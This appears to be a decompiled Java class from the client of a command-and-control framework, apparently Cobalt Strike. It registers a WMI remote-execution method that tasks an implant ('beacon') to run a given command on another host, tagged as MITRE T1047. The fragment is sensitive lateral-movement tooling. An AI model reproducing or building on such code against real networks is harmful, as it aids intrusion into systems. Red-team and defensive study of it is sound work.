package beacon.methods;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExecMethods;
import beacon.TaskBeacon;
import beacon.bof.WMICommand;

public class WMI implements BeaconRemoteExecMethods.RemoteExecMethod {
   protected AggressorClient client;

   public WMI(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconRemoteExecMethods(var1.getData()).register("wmi", "Remote execute via WMI", this);
   }

   public void remoteexec(String var1, String var2, String var3) {
      TaskBeacon var4 = new TaskBeacon(this.client, new String[]{var1});
      var4.log_task(var1, "Tasked beacon to run '" + var3 + "' on " + var2 + " via WMI", "T1047");
      WMICommand var5 = new WMICommand(this.client, var2, var3);
      var5.go(var1);
   }
}
